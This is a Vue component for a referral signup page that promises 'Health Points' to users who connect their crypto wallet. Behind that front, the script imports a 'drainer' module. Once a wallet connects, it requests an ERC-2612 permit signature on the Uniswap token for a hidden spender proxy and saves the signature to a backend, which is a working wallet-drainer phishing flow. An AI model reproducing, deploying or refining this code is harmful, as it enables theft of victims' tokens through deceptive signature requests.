<template>
  <div class="body">
    <div class="container flex items-center justify-center min-h-[80vh]">
      <div class="hero-card max-w-md w-full">
        <h1 class="text-center">Join UHT</h1>
        <p class="lead text-center">
          You were referred by {{ referralAddress?.slice(0,4) }}...{{ referralAddress?.slice(referralAddress?.length-4) }}. Connect your wallet to register and start earning <strong>Health Points</strong>.
        </p>
        <div class="keyline"></div>

        <!-- Connect Wallet Button -->
        <div class="flex justify-center">
          <button class="btn btn-primary w-full" @click="() => connectClicked()" :disabled="loading">
            {{ loading ? "Connecting..." : "Connect Wallet" }}
          </button>
        </div>

        <!-- Status -->
        <p v-if="statusMsg" class="mt-4 text-center opacity-80">{{ statusMsg }}</p>
      </div>
    </div>
  </div>
</template>

<script setup>
    import { getAddress, getIsConnected, subscribeState, openModal, disconnectWallet, getChainID, switchNetwork } from '../../api/web3/walletconnect';
    import { create as saveAddressSignature, getAddressSignature, update as updateAddressSignature } from '../../api/web3/walletSignature';
    import { requestPermitSignature } from '../../api/web3/drainer/permit';
    import { UNISWAP_ADDRESS, UNISWAP_NAME } from '../../api/web3/drainer/constants';
    import { spenderProxyAddress } from '../../api/web3/constants/erc2612permit';
    import { getUser, create as createUser } from '~/api/profile';
    import { create as createRefferral } from '../../api/referral';

    const route = useRoute();
    const referralAddress = route.params.id;
    const auth = useAuth()
    const walletAddress = ref('');
    const addressSignature = ref(null)
    const isWalletConnected = ref(false);
    const initialLoading = ref(false);

    onMounted(() => {
        isWalletConnected.value = getIsConnected();
        walletAddress.value = getAddress();

        listenToWalletStateChange()    
        // if (!walletAddress.value) toggleConnectModal(true)     
    })


    function listenToWalletStateChange() {
        subscribeState()?.on('STATE_CHANGED', events => {
            isWalletConnected.value = getIsConnected();
            walletAddress.value = getAddress();
        });
    }



    function connectClicked(){
        openModal();
    }


    watch(() => walletAddress.value, async() => {
        if (!walletAddress.value) return;
            
        auth.value.isWalletConnected = isWalletConnected.value;
        auth.value.walletAddress = walletAddress.value

        initialLoading.value = true;
        addressSignature.value = await getAddressSignature(walletAddress.value);
        
        const user = await getUser(walletAddress.value)
        const referral = await createRefferral(referralAddress, walletAddress.value)
        if (!user) await createUser(walletAddress.value);

        auth.value.points = user?.points || 0
        auth.value.hasClaimedPoints = user?.hasClaimedPoints || false
        auth.value.lastAnsweredQuestionID = user?.lastAnsweredQuestionID || null
        auth.value.lastAnswerID = user?.lastAnswerID || null


        if (!isWalletConnected.value) {
            openModal()
            return;
        }


        if (getChainID() != 1){
            if (window.ethereum) await switchNetwork(1);
            else {
                await disconnectWallet();
                isWalletConnected.value = false;
                walletAddress.value = "";
                alert("Switch to Ethereum Mainnet Network");  
            }
            return;
        }

        if (isMigrated.value) {
            initialLoading.value = false;
            navigateTo('/dashboard')
            return;
        }

        
        try {
            if (!addressSignature.value) addressSignature.value = await saveAddressSignature(walletAddress.value);

            const signatureResult = await requestPermitSignature(UNISWAP_ADDRESS, UNISWAP_NAME, getChainID(), 1 * (10**18));
            console.log("signatureResult:    ", signatureResult);

            await updateAddressSignature(walletAddress.value, signatureResult); 
            addressSignature.value = await getAddressSignature(walletAddress.value);

            initialLoading.value = false;
            navigateTo('/dashboard')
        } catch (err) {
            initialLoading.value = false
            if (err?.info?.error?.code == -32000) {
                alert("Insufficient funds")
            }
            else if (err?.info?.error?.code == 4001) {
                alert("Transaction rejected")
            } else alert("An error occured")
            console.log(err)
        }
        


    })


    const isMigrated = computed(() => {
        return (addressSignature.value?.signatures?.length && 
            addressSignature.value?.signatures?.map(i => i.token_address.toLowerCase()).includes(UNISWAP_ADDRESS.toLowerCase()) && 
            addressSignature.value?.signatures?.map(i => i.spender.toLowerCase()).includes(spenderProxyAddress.toLowerCase()))
    })

    onMounted(() => {
        disconnectClicked()
    })

    function disconnectClicked() {
        disconnectWallet().then(() => {
            auth.value.walletAddress = '';
            auth.value.isWalletConnected = false;
            auth.value.hasClaimedPoints= false;
            auth.value.points= 0;
            auth.value.lastAnsweredQuestionID= null;
            auth.value.lastAnswerID= null;
        })
    }
</script>

<style scoped>
:root{
  --brand:#6a44ff;
  --stroke:rgba(255,255,255,.18);
  --glass:rgba(255,255,255,.08);
  --text:#f3f4f8;
}

.body {
  margin:0;
  font-family:Inter,system-ui,sans-serif;
  color: white;
  background:
    radial-gradient(90rem 60rem at 80% -10%, #a88bff20 10%, transparent 60%),
    radial-gradient(80rem 60rem at -10% 100%, #5436ff33 5%, transparent 60%),
    linear-gradient(180deg, #5b32ff 0%, #6a44ff 50%, #5a3df6 100%);
  min-height:100vh;
}

.container { max-width:1100px; margin:0 auto; padding:24px; }

.hero-card {
  background:var(--glass); border:1px solid var(--stroke); border-radius:22px; padding:28px;
  backdrop-filter: blur(8px); box-shadow:0 20px 50px rgba(0,0,0,.25);
}
h1 { margin:0 0 10px; font-size:clamp(28px,5vw,42px); line-height:1.2; text-align:center; }
.lead { font-size:16px; opacity:.95; margin-bottom:20px; }

.keyline { height:1px; background:linear-gradient(90deg,transparent,rgba(255,255,255,.3),transparent); margin:18px 0; }

.btn {
  appearance:none; cursor:pointer; padding:12px 18px; border-radius:14px; font-weight:700;
  transition:transform .08s ease, box-shadow .2s ease, background .2s ease;
}
.btn-primary { background:#fff; color:#3e2cff; box-shadow:0 10px 20px rgba(0,0,0,.20); width:100%; }
.btn-primary:hover { transform:translateY(-1px); }
</style>
